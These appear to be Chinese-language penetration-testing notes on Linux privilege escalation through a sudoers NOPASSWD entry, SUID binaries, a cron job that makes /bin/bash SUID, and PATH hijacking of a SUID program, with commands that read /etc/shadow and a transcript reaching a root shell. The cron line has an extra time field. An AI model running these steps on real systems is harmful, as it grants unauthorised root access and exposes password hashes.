#### visudo

```shell
# 管理员配置/etc/sudoers疏忽，给普通用户有执行超级管理员命令的权限

cat /etc/sudoers
# 或
visudo

# 添加
yunkong ALL=(ALL) NOPASSWD:/usr/bin/cat
# 给yunkong用户以root权限运行cat命令的权限

# 普通用户查看哪些命令可以以root权限运行
sudo -l
sudo cat /etc/shadow
```



#### SUID

```shell
# 允许文件执行时以文件拥有者身份运行，可以是命令，也可以是敏感文件

# 设置prog1的suid权限
chmod u+s prog1
# 设置prog2的sgid权限
chmod g+s prog2

# 查找suid文件
find / -perm -u=s -type f 2>/dev/null
# 查找sgid文件
find / -perm -g=s -type f 2>/dev/null


# 举例
# 管理员/usr/lib/cat添加suid权限
chmod u+s /usr/bin/cat
# 普通用户yunkong使用cat查看/etc/shadow
cat /etc/shadow
```

#### 定时任务

```shell
# 在管理员配置不当的情况下，普通用户有权限修改定时任务的配置文件
# 或者在定时任务的配置文件中，有脚本文件是普通用户可以修改的

# 举例，在定时任务中添加定时任务，配合SUID使用
*/1 * * * * * chmod u+s /bin/bash
# 或者在定时执行的脚本中添加
chmod u+s /bin/bash
```

#### 环境变量提权

管理员：

```c
# 1、在/tmp创建1.c
int main() {
  setuid(0);
  setgid(0);
  system("cat /etc/passwd");
  return 0;
}

# gcc 1.c -o 1 编译

# 授予SUID权限
chmod u+s ./1
```

普通用户：

```shell
[yunkong@localhost tmp]$ echo /bin/bash > /tmp/cat
[yunkong@localhost tmp]$ chmod 777 /tmp/cat
[yunkong@localhost tmp]$ export PATH=/tmp:$PATH
[yunkong@localhost tmp]$ ./1
[root@localhost tmp]# 
```

